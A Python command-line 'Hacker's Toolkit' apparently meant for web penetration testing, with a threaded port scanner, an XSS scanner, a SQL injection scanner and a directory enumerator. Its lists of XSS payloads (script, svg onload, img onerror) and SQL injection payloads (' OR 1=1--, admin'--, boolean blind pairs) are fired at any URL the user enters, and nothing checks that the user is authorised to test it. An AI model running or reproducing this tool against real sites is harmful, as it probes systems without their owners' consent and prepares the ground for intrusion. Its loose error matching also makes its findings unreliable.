import requests
from bs4 import BeautifulSoup
import urllib.parse
import socket
import sys
import os
import threading
from colorama import Fore, Style, init

# Initialize colorama for colored terminal output
init(autoreset=True)

# --- GLOBAL VARIABLES ---
# A list of common XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "';!--\"<XSS>=&{()}",
    "<svg onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<body onpageshow=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<a href=\"javascript:alert(1)\">Click Me</a>",
    "\" onmouseover=\"alert(1)\" class=\"",
    "\"--><svg onload=alert(1)>"
]

# List of common SQL Injection payloads, including blind SQLi
SQL_PAYLOADS = {
    "error_based": ["' OR 1=1--", "\" OR 1=1--", "admin'--", "admin' #"],
    "blind_based": ["' AND 1=1--", "' AND 1=2--"] # To check for boolean-based blind SQLi
}
# List of error messages for error-based SQL Injection
SQL_ERROR_MESSAGES = [
    "sql syntax", "mysql_fetch_array", "SQL", "You have an error in your SQL syntax"
]

# --- CORE FUNCTIONS ---
def print_banner():
    """Prints the main banner of the toolkit."""
    print(f"{Fore.GREEN}-------------------------------------")
    print(f"{Fore.GREEN}  Hacker's Toolkit - Professional Edition")
    print(f"{Fore.GREEN}  Programed By DMNHACKER")
    print(f"{Fore.GREEN}-------------------------------------")

def get_target_url():
    """Prompts the user to enter the target URL."""
    while True:
        target = input(f"{Fore.CYAN}[?] Please enter the target URL (e.g., http://testphp.vulnweb.com): {Style.RESET_ALL}")
        if target.startswith("http://") or target.startswith("https://"):
            return target
        else:
            print(f"{Fore.RED}[!] Invalid URL format. Please start with 'http://' or 'https://'.{Style.RESET_ALL}")

def get_base_url(url):
    """Extracts the base URL from a given URL."""
    parsed_url = urllib.parse.urlparse(url)
    return f"{parsed_url.scheme}://{parsed_url.netloc}"

# --- 1. ADVANCED PORT SCANNER ---
def port_scanner(url, port_range=None):
    """
    Scans a range of ports on the target host using threading for speed.
    """
    try:
        host = urllib.parse.urlparse(url).netloc
        print(f"{Fore.CYAN}[*] Starting port scan for: {host}{Style.RESET_ALL}")
        
        if not port_range:
            port_range = range(1, 1025)  # Default to common ports
        
        open_ports = []
        threads = []
        
        def scan_port_thread(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5) # Reduced timeout for faster scans
                result = sock.connect_ex((host, port))
                if result == 0:
                    print(f"{Fore.GREEN}[+] Port {port} is open.{Style.RESET_ALL}")
                    open_ports.append(port)
                sock.close()
            except:
                pass

        for port in port_range:
            thread = threading.Thread(target=scan_port_thread, args=(port,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print(f"{Fore.GREEN}[+] Port scan complete. Found {len(open_ports)} open ports.{Style.RESET_ALL}")
        return open_ports

    except socket.gaierror:
        print(f"{Fore.RED}[!] Hostname could not be resolved.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] An error occurred: {e}{Style.RESET_ALL}")
    return []

# --- 2. ADVANCED XSS SCANNER ---
def xss_scanner(url):
    """
    Scans for XSS vulnerabilities in forms and URL parameters with a larger payload set.
    """
    print(f"{Fore.CYAN}[*] Starting XSS scan for: {url}{Style.RESET_ALL}")
    
    # 1. Check URL parameters first
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    if query_params:
        print(f"{Fore.YELLOW}[*] URL parameters found. Starting direct injection test...{Style.RESET_ALL}")
        for payload in XSS_PAYLOADS:
            for param_name, _ in query_params.items():
                temp_params = query_params.copy()
                temp_params[param_name] = [payload]
                
                new_query = urllib.parse.urlencode(temp_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                try:
                    response = requests.get(test_url, timeout=10)
                    if payload in response.text:
                        print(f"{Fore.RED}[!!!] Possible XSS vulnerability found in URL parameter!{Style.RESET_ALL}")
                        print(f"{Fore.RED}[*] URL: {test_url}{Style.RESET_ALL}")
                        print(f"{Fore.RED}[*] Vulnerable parameter: {param_name}{Style.RESET_ALL}")
                        print(f"{Fore.RED}[*] Payload used: {payload}{Style.RESET_ALL}")
                        return
                except requests.exceptions.RequestException as e:
                    print(f"{Fore.RED}[!] Error in GET request: {e}{Style.RESET_ALL}")
        
    # 2. Check for forms
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        
        if not forms:
            print(f"{Fore.YELLOW}[-] No forms found on the page.{Style.RESET_ALL}")
            return
            
        print(f"{Fore.GREEN}[*] Found {len(forms)} form(s) on the page. Starting form tests...{Style.RESET_ALL}")
        for form in forms:
            test_xss_in_form(form, url)
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error while fetching forms: {e}{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[+] XSS scan complete.{Style.RESET_ALL}")

def test_xss_in_form(form, url):
    """Helper function to test a specific form for XSS."""
    try:
        full_url = urllib.parse.urljoin(url, form.get("action", url))
        form_method = form.get("method", "get").lower()
        
        for payload in XSS_PAYLOADS:
            payload_data = {}
            for input_tag in form.find_all(["input", "textarea", "select"]):
                name = input_tag.get("name")
                if name:
                    payload_data[name] = payload
            
            response = requests.request(form_method, full_url, data=payload_data if form_method == 'post' else None, params=payload_data if form_method == 'get' else None, timeout=10)
            
            if payload in response.text:
                print(f"{Fore.RED}[!!!] Possible XSS vulnerability found in form!{Style.RESET_ALL}")
                print(f"{Fore.RED}[*] URL: {full_url}{Style.RESET_ALL}")
                print(f"{Fore.RED}[*] Method: {form_method.upper()}{Style.RESET_ALL}")
                print(f"{Fore.RED}[*] Payload used: {payload}{Style.RESET_ALL}")
                return
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error in form test: {e}{Style.RESET_ALL}")

# --- 3. ADVANCED SQL INJECTION SCANNER ---
def sql_injection_scanner(url):
    """
    Tests URL parameters for advanced SQL Injection vulnerabilities (error and blind-based).
    """
    print(f"{Fore.CYAN}[*] Starting SQL Injection scan for: {url}{Style.RESET_ALL}")
    
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    if not query_params:
        print(f"{Fore.YELLOW}[-] No parameters found in URL. SQL Injection scan stopped.{Style.RESET_ALL}")
        return
        
    for param_name in query_params:
        original_value = query_params[param_name][0]
        
        # Test for error-based SQLi
        for payload in SQL_PAYLOADS["error_based"]:
            query_params[param_name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            try:
                response = requests.get(test_url, timeout=10)
                if any(err_msg in response.text for err_msg in SQL_ERROR_MESSAGES):
                    print(f"{Fore.RED}[!!!] Possible Error-based SQL Injection vulnerability found!{Style.RESET_ALL}")
                    print(f"{Fore.RED}[*] Vulnerable parameter: {param_name}{Style.RESET_ALL}")
                    print(f"{Fore.RED}[*] Vulnerable URL: {test_url}{Style.RESET_ALL}")
                    print(f"{Fore.RED}[*] Payload used: {payload}{Style.RESET_ALL}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}[!] Error in connection: {e}{Style.RESET_ALL}")
                return

        # Test for boolean-based blind SQLi
        print(f"{Fore.BLUE}[*] Testing for Blind SQL Injection on parameter '{param_name}'...{Style.RESET_ALL}")
        
        query_params[param_name] = [SQL_PAYLOADS["blind_based"][0]]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        true_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        
        query_params[param_name] = [SQL_PAYLOADS["blind_based"][1]]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        false_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        
        try:
            true_response = requests.get(true_url, timeout=10)
            false_response = requests.get(false_url, timeout=10)
            
            if true_response.status_code != false_response.status_code:
                print(f"{Fore.RED}[!!!] Possible Blind SQL Injection vulnerability found! (Different status codes){Style.RESET_ALL}")
                print(f"{Fore.RED}[*] Vulnerable parameter: {param_name}{Style.RESET_ALL}")
                return
                
            if len(true_response.text) != len(false_response.text):
                print(f"{Fore.RED}[!!!] Possible Blind SQL Injection vulnerability found! (Different content length){Style.RESET_ALL}")
                print(f"{Fore.RED}[*] Vulnerable parameter: {param_name}{Style.RESET_ALL}")
                return
                
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Error in connection: {e}{Style.RESET_ALL}")
            return
            
        query_params[param_name] = [original_value]
            
    print(f"{Fore.GREEN}[+] SQL Injection scan complete. No likely vulnerabilities found.{Style.RESET_ALL}")

# --- 4. ADVANCED DIRECTORY SCANNER ---
def directory_enumerator(url, wordlist_path=None):
    """
    Enumerates common directories and files using a wordlist.
    """
    print(f"{Fore.CYAN}[*] Starting directory scan for: {url}{Style.RESET_ALL}")
    
    base_url = get_base_url(url)
    
    if not wordlist_path:
        wordlist_path = "common_paths.txt"
        print(f"{Fore.YELLOW}[*] No wordlist specified, using default '{wordlist_path}'.{Style.RESET_ALL}")
        
    try:
        with open(wordlist_path, 'r') as f:
            paths = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Error: Wordlist file '{wordlist_path}' not found.{Style.RESET_ALL}")
        return
        
    def scan_path(path):
        test_url = urllib.parse.urljoin(base_url, path)
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Path/file found: {test_url}{Style.RESET_ALL}")
            elif response.status_code == 403:
                print(f"{Fore.YELLOW}[*] Path/file {test_url} found, but access is forbidden (403).{Style.RESET_ALL}")
            elif response.status_code in [301, 302]:
                print(f"{Fore.BLUE}[*] Path/file {test_url} redirected (Status Code {response.status_code}).{Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            pass
            
    # Using threading for faster scanning
    threads = []
    for path in paths:
        thread = threading.Thread(target=scan_path, args=(path,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"{Fore.GREEN}[+] Directory scan complete.{Style.RESET_ALL}")

def main():
    """Main function to display menu and execute the selected test."""
    print_banner()

    while True:
        print(f"\n{Fore.WHITE}-------------------------------------")
        print(f"{Fore.YELLOW}Please select the type of professional penetration test you would like to perform:")
        print(f"1. Advanced Port Scan")
        print(f"2. Advanced XSS Scan")
        print(f"3. Advanced SQL Injection Scan")
        print(f"4. Directory Scan with Wordlist")
        print(f"5. Exit")
        
        choice = input(f"{Fore.WHITE}[?] Your choice: {Style.RESET_ALL}")
        
        if choice == '5':
            print(f"{Fore.CYAN}Goodbye!{Style.RESET_ALL}")
            break
        
        if choice in ['1', '2', '3', '4']:
            target_url = get_target_url()
            print(f"{Fore.WHITE}-------------------------------------")
            
            if choice == '1':
                port_scanner(target_url)
            elif choice == '2':
                xss_scanner(target_url)
            elif choice == '3':
                sql_injection_scanner(target_url)
            elif choice == '4':
                print(f"{Fore.YELLOW}[*] For this scan, you need a wordlist file (e.g., 'common_paths.txt').{Style.RESET_ALL}")
                wordlist_path = input(f"{Fore.CYAN}[?] Enter the path to your wordlist file: {Style.RESET_ALL}")
                directory_enumerator(target_url, wordlist_path)
        else:
            print(f"{Fore.RED}[!] Invalid choice. Please enter a number from 1 to 5.{Style.RESET_ALL}")
    
if __name__ == "__main__":
    main()
